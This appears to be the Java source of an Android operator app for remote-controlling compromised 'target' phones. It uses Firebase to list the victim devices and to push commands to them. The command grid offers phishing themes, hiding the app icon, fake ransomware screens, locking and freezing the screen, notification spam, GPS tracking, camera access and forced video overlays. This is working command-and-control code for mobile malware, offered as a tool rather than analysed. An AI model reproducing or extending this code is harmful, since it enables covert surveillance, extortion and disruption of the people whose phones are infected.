package com.paragon.control;

import android.animation.Animator;
import android.animation.AnimatorListenerAdapter;
import android.app.AlertDialog;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.text.InputType;
import android.view.Gravity;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.GridLayout;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import com.google.android.material.snackbar.Snackbar;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private DatabaseReference mDatabase;
    private StorageReference mStorage;

    private FrameLayout rootLayout;
    private LinearLayout dialogOverlay, targetListLayout, controlLayout;
    private LinearLayout targetContainer;
    private GridLayout gridFitur;
    private Button btnPilihTarget, btnRefresh;

    private String selectedTargetId = null;
    private boolean isTargetConnected = false;
    private boolean hasCheckedTarget = false;

    private static final int REQUEST_VIDEO = 1001;

    private ValueEventListener targetListListener;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        rootLayout = findViewById(R.id.rootLayout);
        dialogOverlay = findViewById(R.id.dialogOverlay);
        targetListLayout = findViewById(R.id.targetListLayout);
        controlLayout = findViewById(R.id.controlLayout);
        targetContainer = findViewById(R.id.targetContainer);
        gridFitur = findViewById(R.id.gridFitur);
        btnPilihTarget = findViewById(R.id.btnPilihTarget);
        btnRefresh = findViewById(R.id.btnRefresh);

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mDatabase = database.getReference("target");
        mStorage = FirebaseStorage.getInstance().getReference();

        // ===== TOMBOL PILIH TARGET =====
        btnPilihTarget.setOnClickListener(v -> {
            checkTargetsAndProceed();
        });

        // ===== TOMBOL REFRESH =====
        btnRefresh.setOnClickListener(v -> {
            checkTargetsAndProceed();
        });

        // ===== CEK TARGET SAAT APLIKASI DIBUKA =====
        checkTargetsAndProceed();

        // ===== SETUP GRID =====
        setupGrid();
    }

    // ===== CEK TARGET =====
    private void checkTargetsAndProceed() {
        // Tampilkan loading di dialog
        btnPilihTarget.setText("⏳ Mencari...");
        btnPilihTarget.setEnabled(false);
        btnRefresh.setEnabled(false);

        mDatabase.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                btnPilihTarget.setText("PILIH TARGET");
                btnPilihTarget.setEnabled(true);
                btnRefresh.setEnabled(true);

                boolean hasTarget = false;
                boolean hasOnlineTarget = false;

                for (DataSnapshot child : snapshot.getChildren()) {
                    String key = child.getKey();
                    if (key == null || key.equals("serverUrl")) continue;
                    Boolean online = child.child("online").getValue(Boolean.class);
                    if (online != null && online) {
                        hasOnlineTarget = true;
                    }
                    hasTarget = true;
                    break;
                }

                if (hasTarget && hasOnlineTarget) {
                    // ADA TARGET ONLINE → tampilkan daftar target
                    showTargetList();
                } else {
                    // BELUM ADA TARGET → tampilkan dialog
                    showDialogNoTarget();
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                btnPilihTarget.setText("PILIH TARGET");
                btnPilihTarget.setEnabled(true);
                btnRefresh.setEnabled(true);
                Toast.makeText(MainActivity.this, "❌ Gagal memuat data", Toast.LENGTH_SHORT).show();
            }
        });
    }

    // ===== TAMPILKAN DIALOG BELUM ADA TARGET =====
    private void showDialogNoTarget() {
        dialogOverlay.setVisibility(View.VISIBLE);
        targetListLayout.setVisibility(View.GONE);
        controlLayout.setVisibility(View.GONE);
    }

    // ===== TAMPILKAN DAFTAR TARGET =====
    private void showTargetList() {
        dialogOverlay.setVisibility(View.GONE);
        targetListLayout.setVisibility(View.VISIBLE);
        controlLayout.setVisibility(View.GONE);

        // Ambil daftar target dari Firebase
        mDatabase.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                targetContainer.removeAllViews();
                boolean hasTarget = false;

                for (DataSnapshot child : snapshot.getChildren()) {
                    String key = child.getKey();
                    if (key == null || key.equals("serverUrl")) continue;

                    String deviceName = child.child("deviceName").getValue(String.class);
                    String deviceId = child.child("deviceId").getValue(String.class);
                    Integer battery = child.child("battery").getValue(Integer.class);
                    Boolean online = child.child("online").getValue(Boolean.class);
                    String androidVersion = child.child("androidVersion").getValue(String.class);

                    if (deviceName == null || deviceId == null) continue;
                    hasTarget = true;

                    // Inflate item target
                    View item = getLayoutInflater().inflate(R.layout.item_target, null);

                    TextView tvName = item.findViewById(R.id.tvTargetName);
                    TextView tvDevice = item.findViewById(R.id.tvTargetDevice);
                    TextView tvAndroid = item.findViewById(R.id.tvTargetAndroid);
                    TextView tvStatus = item.findViewById(R.id.tvTargetStatus);
                    Button btnControl = item.findViewById(R.id.btnControl);

                    tvName.setText(deviceName);
                    tvDevice.setText(deviceName);
                    tvAndroid.setText(androidVersion != null ? androidVersion : "Android 13");
                    tvStatus.setText(online != null && online ? "🟢 ONLINE" : "🔴 OFFLINE");
                    tvStatus.setTextColor(online != null && online ? 0xFF30D158 : 0xFFE56A8D);

                    if (online == null || !online) {
                        btnControl.setEnabled(false);
                        btnControl.setAlpha(0.5f);
                    }

                    btnControl.setOnClickListener(v -> {
                        selectedTargetId = key;
                        isTargetConnected = true;
                        showControlDevice();
                    });

                    targetContainer.addView(item);
                }

                if (!hasTarget) {
                    showDialogNoTarget();
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Toast.makeText(MainActivity.this, "❌ Gagal memuat daftar target", Toast.LENGTH_SHORT).show();
            }
        });
    }

    // ===== TAMPILKAN HALAMAN CONTROL DEVICE =====
    private void showControlDevice() {
        dialogOverlay.setVisibility(View.GONE);
        targetListLayout.setVisibility(View.GONE);
        controlLayout.setVisibility(View.VISIBLE);
    }

    // ===== SETUP GRID FITUR =====
    private void setupGrid() {
        String[] fiturNames = {
            "Flashlight", "Lock Low", "Lock Custom V2", "Tema Phising",
            "Video Overlay", "Hide Icon", "Spam Notifikasi", "Stuck Layar",
            "GPS", "Kamera", "Fake Ransomware", "Ngehang"
        };
        String[] fiturIcons = {"🔦", "🔒", "🔒", "🎨", "🎬", "👻", "📨", "🔒", "📍", "📸", "💰", "💀"};
        boolean[] isToggle = {true, true, true, false, false, true, false, false, false, false, false, true};

        gridFitur.removeAllViews();

        for (int i = 0; i < fiturNames.length; i++) {
            View card = getLayoutInflater().inflate(R.layout.card_fitur_premium, null);

            TextView icon = card.findViewById(R.id.ivIcon);
            TextView nama = card.findViewById(R.id.tvNamaFitur);
            TextView status = card.findViewById(R.id.tvStatusFitur);
            Switch sw = card.findViewById(R.id.swFitur);
            Button btnAction = card.findViewById(R.id.btnAction);

            icon.setText(fiturIcons[i]);
            nama.setText(fiturNames[i]);

            if (isToggle[i]) {
                sw.setVisibility(View.VISIBLE);
                btnAction.setVisibility(View.GONE);
                status.setVisibility(View.VISIBLE);

                // Set status awal
                status.setText("OFF");
                status.setTextColor(0xFFE56A8D);

                final int index = i;
                sw.setOnCheckedChangeListener((buttonView, isChecked) -> {
                    if (!checkTargetConnection()) {
                        sw.setChecked(!isChecked);
                        return;
                    }
                    status.setText(isChecked ? "ON" : "OFF");
                    status.setTextColor(isChecked ? 0xFF30D158 : 0xFFE56A8D);
                    // Kirim perintah ke Firebase
                    mDatabase.child(selectedTargetId).child(fiturNames[index].toLowerCase()).setValue(isChecked);
                    showSnackbar("Perintah berhasil dikirim");
                });
            } else {
                sw.setVisibility(View.GONE);
                btnAction.setVisibility(View.VISIBLE);
                status.setVisibility(View.GONE);

                final int index = i;
                btnAction.setOnClickListener(v -> {
                    if (!checkTargetConnection()) return;
                    showConfirmDialog(fiturNames[index]);
                });
            }

            gridFitur.addView(card);
        }
    }

    // ===== DIALOG KONFIRMASI =====
    private void showConfirmDialog(String fiturName) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Konfirmasi");
        builder.setMessage("Apakah Anda yakin ingin menjalankan fitur " + fiturName + "?");
        builder.setPositiveButton("Jalankan", (dialog, which) -> {
            showSnackbar("⏳ Mengirim perintah...");
            handler.postDelayed(() -> {
                mDatabase.child(selectedTargetId).child("command").setValue(fiturName.toLowerCase());
                showSnackbar("✅ Perintah berhasil dikirim ke target");
            }, 1000);
        });
        builder.setNegativeButton("Batal", null);
        builder.show();
    }

    // ===== CEK KONEKSI TARGET =====
    private boolean checkTargetConnection() {
        if (selectedTargetId == null || !isTargetConnected) {
            showSnackbar("⚠️ Silakan pilih target terlebih dahulu");
            return false;
        }
        return true;
    }

    // ===== SNACKBAR =====
    private void showSnackbar(String message) {
        Snackbar.make(findViewById(android.R.id.content), message, Snackbar.LENGTH_SHORT).show();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_VIDEO && resultCode == RESULT_OK && data != null) {
            Uri videoUri = data.getData();
            uploadVideoToFirebase(videoUri);
        }
    }

    private void uploadVideoToFirebase(Uri videoUri) {
        if (!checkTargetConnection()) return;
        StorageReference ref = mStorage.child("videos/" + System.currentTimeMillis() + ".mp4");
        ref.putFile(videoUri).addOnSuccessListener(taskSnapshot -> {
            ref.getDownloadUrl().addOnSuccessListener(uri -> {
                mDatabase.child(selectedTargetId).child("videoUrl").setValue(uri.toString());
                showSnackbar("✅ Video terkirim ke target!");
            });
        }).addOnFailureListener(e -> {
            showSnackbar("❌ Gagal upload video");
        });
    }
                    }
